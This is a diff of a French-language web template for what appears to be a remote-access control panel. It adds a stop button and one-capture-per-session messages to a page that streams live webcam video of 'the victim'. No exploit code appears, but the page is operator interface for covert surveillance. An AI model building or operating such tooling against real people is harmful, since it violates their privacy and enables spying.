@@ -3,16 +3,16 @@
 
   {% if has_webcam %}
 
-	<p>Vous pouvez accéder en direct à la capture vidéo de la webcam de la cible. La capture se fait par tranches de 10 secondes. </p>
+	<p>Vous pouvez accéder en direct à la capture vidéo de la webcam de la cible. </p>
 	<div class="alert alert-warning" role="alert">
-		Si vous souhaitez quitter la page, il est vivement conseillé d'attendre la fin de la période de capture. Dans le cas contraire, des erreurs risquent d'apparaître dans la suite de la navigation.
-	</div> 
+    Pour des raisons techniques, il n'est possible d'effectuer qu'une seule capture vidéo par session.
+	</div>
 
 
 	{% if not enabled %}
 
 	<p class="text-center">
-		<a class="btn btn-primary" href="?action=start" role="button"><i class="fas fa-play    "></i> Lancer la capture</a>
+		<a class="btn btn-primary" href="?action=start" role="button"><i class="fas fa-play"></i>Lancer la capture</a>
 	</p>
 	{% endif %}
 
@@ -21,6 +21,9 @@
 		<h2><font color="red">Error: You need Javascript enabled to watch the stream.</font></h2>
 	</noscript>
 
+  <p class="text-center">
+    <a class="btn btn-danger" href="?action=stop" role="button"><i class="fas fa-stop"></i>Arrêter la capture</a>
+  </p>
 
 	<div style="float: right">
 		<div class="spinner-grow text-danger" role="status">
@@ -51,9 +54,9 @@
                                 	img.style = "display:";
                                         value = JSON.parse(this.responseText).value;
 	                                if (!value) {
-                                               location.replace(window.location.protocol + '//' + window.location.host + '/sessions/{{ id }}/session_live');
+                                        location.replace(window.location.protocol + '//' + window.location.host + '/sessions/{{ id }}/session_live');
 	                                }
-	
+
 				} else {
 					console.log("Status answer: %d (%s)", this.status, this.statusText);
 				}
@@ -70,9 +73,9 @@
 
 	{% endif %}
 
-	
+
 	{% if not has_webcam %}
-	<p class="alert alert-danger">La victime n'a pas de webcam.</p>
+	<p class="alert alert-danger">La victime n'a pas de webcam ou bien un live vidéo a déjà été réalisé (une seule fois par session pour raison technique).</p>
 	{% endif %}
 
 
